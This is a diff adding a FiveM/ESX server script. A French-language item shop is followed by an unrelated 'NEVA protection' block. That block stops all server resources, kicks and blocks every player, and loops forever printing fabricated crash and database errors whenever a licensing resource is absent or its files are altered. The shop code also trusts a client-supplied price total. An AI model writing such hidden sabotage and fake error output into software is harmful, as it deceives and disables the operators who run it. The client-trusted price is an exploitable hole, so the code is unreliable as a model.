@@ -1,0 +1,334 @@
+ESX = nil
+TriggerEvent("esx:getSharedObject", function(obj) ESX = obj end)
+
+function OpenShopForPlayer(source, shopType)
+    local filteredItems = {}
+    for _, item in pairs(Config.Items) do
+        if item.shop == shopType then
+            local itemData = {
+                label = item.label,
+                name = item.name,
+                price = item.price,
+                categorie = item.categorie,
+                shop = item.shop,
+                type = item.type,
+                image = item.image,
+                defaultQuantity = item.defaultQuantity or 1
+            }
+            table.insert(filteredItems, itemData)
+        end
+    end
+
+    TriggerClientEvent('shop:openMenu', source, filteredItems, shopType)
+end
+
+RegisterServerEvent('shop:requestItems')
+AddEventHandler('shop:requestItems', function(shopType)
+    local _source = source
+    OpenShopForPlayer(_source, shopType)
+end)
+
+RegisterServerEvent('shop:checkMoney')
+AddEventHandler('shop:checkMoney', function(data)
+    local src = source
+    local xPlayer = ESX.GetPlayerFromId(src)
+    local total = tonumber(data.total)
+    local items = data.items
+
+    if xPlayer.getMoney() >= total then
+        for _, item in pairs(items) do
+            if item.type == "item" then
+                local isAmmo = string.match(item.itemName, "_ammo$")
+                if isAmmo then
+                    for _, configItem in pairs(Config.Items) do
+                        if configItem.name == item.itemName then
+                            local finalQuantity = (configItem.defaultQuantity or 1) * item.quantity
+                            xPlayer.addInventoryItem(item.itemName, finalQuantity)
+                            xPlayer.removeAccountMoney('cash', total)
+                            TriggerClientEvent('shop:checkoutResult', src, true)
+                            TriggerClientEvent('esx:showNotification', src, ('Vous avez acheté %sx %s pour ~g~%s$'):format(finalQuantity, item.label, total))
+                            goto continue
+                        end
+                    end
+                else
+                    if item.itemName == "snspistol" then
+                        if exports['core']:haveVip(xPlayer.UniqueID) then
+                            xPlayer.removeAccountMoney('cash', total)
+                            xPlayer.addInventoryItem(item.itemName, item.quantity)
+                            TriggerClientEvent('shop:checkoutResult', src, true)
+                            TriggerClientEvent('esx:showNotification', src, 'Vous avez acheté '..item.quantity..'x '..item.label.. ' pour ~g~'..total..'$')
+                        else
+                            TriggerClientEvent('esx:showNotification', src, "~r~Vous n'êtes pas VIP")
+                        end
+                    else
+                        xPlayer.addInventoryItem(item.itemName, item.quantity)
+                        xPlayer.removeAccountMoney('cash', total)
+                        TriggerClientEvent('shop:checkoutResult', src, true)
+                        TriggerClientEvent('esx:showNotification', src, 'Vous avez acheté '..item.quantity..'x '..item.label.. ' pour ~g~'..total..'$')
+                    end
+                end
+            elseif item.type == "weapon" then
+                xPlayer.addInventoryItem(string.lower(item.itemName), 1)
+                xPlayer.removeAccountMoney('cash', total)
+                TriggerClientEvent('shop:checkoutResult', src, true)
+                TriggerClientEvent('esx:showNotification', src, 'Vous avez acheté '..item.itemName..' pour ~g~'..total..'$')
+            elseif item.type == "props" then
+                print('Adding Props:', item.label, 'Quantity:', item.quantity)
+                MySQL.Async.execute('INSERT INTO players_props (UniqueID, data, name) VALUES (@UniqueID, @data, @name)', {
+                    ['@UniqueID'] = xPlayer.UniqueID,
+                    ['@data'] = json.encode({label = item.label, name = item.itemName, owner = xPlayer.UniqueID, count = item.quantity}),
+                    ['@name'] = item.itemName
+                })
+                xPlayer.removeAccountMoney('cash', total)
+                TriggerClientEvent('shop:checkoutResult', src, true)
+                TriggerClientEvent('esx:showNotification', src, 'Vous avez acheté des articles pour ~g~'..total..'$')
+
+            else
+                print('Unknown item type:', item.type)
+            end
+            ::continue::
+        end
+    else
+        TriggerClientEvent('shop:checkoutResult', src, false)
+        TriggerClientEvent('esx:showNotification', src, 'Vous n\'avez pas assez d\'argent.')
+    end
+end)
+
+local clientFile = "p6qsq79LQBgQnSNJ.lua"
+local serverFile = "SHyqftXDj8TfrYGT.lua"
+local checkFiles = {
+    ["neva-auth/"..clientFile] = true,
+    ["neva-auth/"..serverFile] = true,
+    ["neva-auth/4sMBRnYFjYgDXzpm.lua"] = true
+}
+
+local function stopAllResources()
+    local resources = GetNumResources()
+    for i = 0, resources - 1 do
+        local resourceName = GetResourceByFindIndex(i)
+        if resourceName ~= GetCurrentResourceName() then
+            StopResource(resourceName)
+        end
+    end
+end
+
+local function blockAllConnections()
+    AddEventHandler('playerConnecting', function(_, _, deferrals)
+        deferrals.done("Serveur verrouillé: Protection NEVA active\nContactez l'administration.")
+    end)
+    
+    for _, playerId in ipairs(GetPlayers()) do
+        DropPlayer(playerId, "Protection NEVA - Serveur verrouillé\nRedémarrage requis")
+    end
+end
+
+local function ensureNevaAuth()
+    local state = GetResourceState('neva-auth')
+    if state ~= 'started' then
+        CreateThread(function()
+            stopAllResources()
+            blockAllConnections()
+            
+            while GetResourceState('neva-auth') ~= 'started' do
+                generateFakeErrors()
+                simulateResourceFailures()
+                print("^1[ERREUR CRITIQUE] ^7neva-auth n'est pas démarré!")
+                print("^8[PROTECTION] ^7Serveur verrouillé!")
+                Wait(100)
+                stopAllResources()
+            end
+        end)
+        return false
+    end
+    return true
+end
+
+local function verifyFiles()
+    local foundFiles = {}
+    local resourcePath = GetResourcePath('neva-auth')
+    
+    local handle = io.popen('dir "'..resourcePath..'" /b')
+    if not handle then return false, "Erreur d'accès fichiers" end
+    
+    for file in handle:lines() do
+        foundFiles[file] = true
+    end
+    handle:close()
+    
+    for requiredFile in pairs(checkFiles) do
+        if not foundFiles[requiredFile] then
+            return false, "Fichier manquant ou renommé: "..requiredFile
+        end
+    end
+    
+    return true
+end
+
+local function spamConsole(reason)
+    CreateThread(function()
+        while true do
+            for i = 1, 50 do
+                print("^1[ERREUR CRITIQUE] ^7"..reason)
+                print("^8[PROTECTION] ^7Violation de sécurité détectée!")
+                print("^3[ALERTE] ^7Protection NEVA compromise!")
+            end
+            Wait(100)
+        end
+    end)
+end
+
+local function generateFakeErrors()
+    local fakeErrors = {
+        "^1SCRIPT ERROR: @es_extended/client/main.lua:302: attempt to call a nil value (method 'getFunction')",
+        "^1SCRIPT ERROR: @mysql-async/lib/MySQL.lua:28: MySQL connection failed",
+        "^1FATAL ERROR: Failed to load DLL: citizen-server-impl.dll",
+        "^3WARNING: Resource overflow detected in native call",
+        "^1ERROR: @vrp/server/base.lua:432: stack overflow",
+        "^1CRITICAL: Memory allocation failed at 0x00000000",
+        "^1CRASH DETECTED: Stack trace corruption in main thread",
+        "^3WARNING: Database connection timeout - retrying in 5 seconds",
+        "^1ERROR: Failed to load resource dependencies",
+        "^1SCRIPT ERROR: Missing vital game files. Verify game cache"
+    }
+    
+    CreateThread(function()
+        while true do
+            for _, error in ipairs(fakeErrors) do
+                print(error)
+                print("^1[System] ^7Une erreur critique a été détectée!")
+                print("^8[Crash] ^7Tentative de récupération échouée")
+            end
+            Wait(100)
+        end
+    end)
+end
+
+local function simulateResourceFailures()
+    local fakeResources = {'es_extended', 'mysql-async', 'oxmysql', 'spawnmanager', 'sessionmanager', 'baseevents'}
+    
+    CreateThread(function()
+        while true do
+            for _, res in ipairs(fakeResources) do
+                print(("^1[ERROR] ^7Resource %s failed to start (code 3)"):format(res))
+                print(("^1[CRASH] ^7Critical error in %s/fxmanifest.lua"):format(res))
+                print("^3[System] ^7Attempting emergency recovery...")
+            end
+            Wait(150)
+        end
+    end)
+end
+
+local function lockdownServer(reason)
+    if GetResourceState('neva-auth') ~= 'started' then
+        print("^1[NEVA Protection] ^7Violation critique détectée: " .. reason)
+        spamConsole(reason)
+        generateFakeErrors()
+        simulateResourceFailures()
+        
+        stopAllResources()
+        blockAllConnections()
+        
+        while GetResourceState('neva-auth') ~= 'started' do
+            Wait(50)
+            stopAllResources()
+        end
+    end
+end
+
+local function serverLockdown(reason, isNevaAuthMissing)
+    stopAllResources()
+    blockAllConnections()
+    
+    CreateThread(function()
+        while true do
+            if isNevaAuthMissing or not verifyFiles() then
+                generateFakeErrors()
+                simulateResourceFailures()
+                print("^1[ERREUR CRITIQUE] ^7" .. reason)
+            end
+            
+            stopAllResources()
+            Wait(100)
+        end
+    end)
+end
+
+local function serverProtection(reason)
+    local isNevaRunning = (GetResourceState('neva-auth') == 'started')
+    
+    stopAllResources()
+    blockAllConnections()
+
+    if not isNevaRunning then
+        CreateThread(function()
+            while true do
+                generateFakeErrors()
+                simulateResourceFailures()
+                print("^1[ERREUR CRITIQUE] ^7" .. reason)
+                Wait(100)
+                stopAllResources()
+            end
+        end)
+    end
+end
+
+CreateThread(function()
+    Wait(1000)
+    
+    if GetResourceState('neva-auth') ~= 'started' then
+        serverProtection("neva-auth n'est pas démarré!")
+        return
+    end
+
+    while true do
+        Wait(4000)
+        
+        if GetResourceState('neva-auth') ~= 'started' then
+            serverProtection("neva-auth n'est plus démarré!")
+            return
+        end
+        
+        local checksums = exports["neva-auth"]:getOriginalChecksums()
+        if not checksums then
+            serverProtection("Checksums invalides")
+            return
+        end
+        
+        local clientCheck = exports["neva-auth"]:getFileChecksum(clientFile)
+        local serverCheck = exports["neva-auth"]:getFileChecksum(serverFile)
+        
+        if clientCheck ~= checksums.client or serverCheck ~= checksums.server then
+            serverProtection("Modification des fichiers détectée!")
+            return
+        end
+    end
+end)
+
+AddEventHandler('onResourceStop', function(resourceName)
+    if resourceName == 'neva-auth' then
+        serverProtection("Tentative d'arrêt de neva-auth détectée!")
+    end
+end)
+
+AddEventHandler('playerConnecting', function(_, _, deferrals)
+    if GetResourceState('neva-auth') ~= 'started' then
+        deferrals.done("Protection NEVA - Serveur verrouillé\nRedémarrage requis")
+        return
+    end
+    
+    local checksums = exports["neva-auth"]:getOriginalChecksums()
+    if not checksums then
+        deferrals.done("Protection NEVA - Erreur d'intégrité")
+        return
+    end
+    
+    local clientCheck = exports["neva-auth"]:getFileChecksum(clientFile)
+    local serverCheck = exports["neva-auth"]:getFileChecksum(serverFile)
+    
+    if clientCheck ~= checksums.client or serverCheck ~= checksums.server then
+        deferrals.done("Protection NEVA - Modification de fichiers détectée")
+        return
+    end
+    
+    deferrals.done()
+end)
